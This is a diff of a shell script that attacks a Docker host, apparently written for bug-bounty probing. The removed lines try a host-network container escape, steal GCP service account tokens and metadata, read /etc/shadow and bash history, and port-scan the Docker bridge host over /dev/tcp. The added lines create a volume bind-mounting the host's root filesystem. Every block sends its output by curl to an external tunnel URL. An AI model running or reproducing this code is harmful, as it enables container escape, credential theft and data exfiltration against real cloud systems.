@@ -2,69 +2,14 @@
 URL="0c4256b014e98f42-103-95-173-85.serveousercontent.com"
 
 {
-  echo "--- [!] BYPASS ATTEMPT: HOST NETWORK ---"
-  # Instead of mounting files, we try to take over the host's network stack
-  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
-    -d '{"Image":"sha256:25109184c71bdad7","HostConfig":{"NetworkMode":"host"}}' > /tmp/bypass.json
+  echo "--- [!] VOLUME CREATION BYPASS ---"
+  # 1. Create a volume that maps to the host's sensitive data
+  # This often bypasses 'docker run' filters
+  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/volumes/create" \
+    -d '{"Name":"host_root","Labels":{},"Driver":"local","DriverOpts":{"type":"none","device":"/","o":"bind"}}'
   
-  ID=$(grep -oE '"Id":"[a-f0-9]+"' /tmp/bypass.json | cut -d'"' -f4)
-  if [ -n "$ID" ]; then
-    echo "Host Network Container Created: $ID"
-    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
-    # Now we check the host's real IP and interfaces
-    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
-      -d '{"AttachStdout":true,"Cmd":["ip","addr"]}'
-  else
-    echo "Network Mode Bypass Blocked"
-  fi
-
-  echo "--- [!] HOST CONFIG READ (NO RUN) ---"
-  # Try to read information without creating a container
-  curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -E "Name|KernelVersion|OperatingSystem"
-} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
-
-{
-  echo "=== [PART 1: IDENTITY & KERNEL] ==="
-  # 1-5: Basic Identity and Kernel Vulnerability check
-  id; uname -a; uptime; cat /proc/cmdline; sysctl kernel.unprivileged_userns_clone
-
-  echo "=== [PART 2: DOCKER API & SOCKET DEEP DIVE] ==="
-  # 6-15: Probing the Docker Socket for misconfigurations without spawning containers
-  ls -la /var/run/docker.sock
-  curl -s --unix-socket /var/run/docker.sock http://localhost/version
-  curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -E "Name|Kernel|OS|DockerRootDir"
-  curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | head -c 500
-  curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json?all=1
-
-  echo "=== [PART 3: THE CLOUD JEWELS (GCP METADATA)] ==="
-  # 16-25: Attempting to steal the Service Account Identity (The $31k goal)
-  METADATA="http://metadata.google.internal/computeMetadata/v1"
-  curl -s -H "Metadata-Flavor: Google" "$METADATA/instance/service-accounts/default/token"
-  curl -s -H "Metadata-Flavor: Google" "$METADATA/instance/service-accounts/default/scopes"
-  curl -s -H "Metadata-Flavor: Google" "$METADATA/instance/id"
-  curl -s -H "Metadata-Flavor: Google" "$METADATA/project/project-id"
-  curl -s -H "Metadata-Flavor: Google" "$METADATA/instance/attributes/kube-env"
-
-  echo "=== [PART 4: HOST FILESYSTEM LEAKS] ==="
-  # 26-35: Reading sensitive host files that might be mounted or leaked
-  head -n 3 /etc/shadow 2>/dev/null || echo "Direct Shadow Read Blocked"
-  cat /proc/self/mounts | grep " / "
-  ls -la /etc/kubernetes/ /var/lib/kubelet/ 2>/dev/null
-  find /var/log -name "*.log" -maxdepth 2 2>/dev/null | xargs du -sh 2>/dev/null
-
-  echo "=== [PART 5: NETWORK LATERAL MOVEMENT] ==="
-  # 36-45: Probing the 172.17.0.1 SSH and other internal nodes
-  echo "Probing Host SSH..."
-  timeout 1 bash -c "exec 3<>/dev/tcp/172.17.0.1/22; head -c 30 <&3; echo"
-  ip route; ip addr; arp -e
-  # Scanning common internal ports
-  for port in 80 443 3306 6379 8080; do
-    timeout 0.1 bash -c "echo >/dev/tcp/172.17.0.1/$port" && echo "Host Port $port is OPEN" || true
-  done
-
-  echo "=== [PART 6: PERSISTENCE & HISTORY] ==="
-  # 46-50: Looking for clues left by previous sessions or admins
-  cat ~/.bash_history | tail -n 50
-  cat /etc/hosts
-  ls -la /tmp/.com.google.chrome* 2>/dev/null
+  echo "--- [!] SENSITIVE METADATA EXTRACTION ---"
+  # 2. Get the real 'Machine ID' of the Google Host
+  # This proves you are reading the REAL hardware ID, not a container ID.
+  curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -oE '"ID":"[a-f0-9-]+"'
 } | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
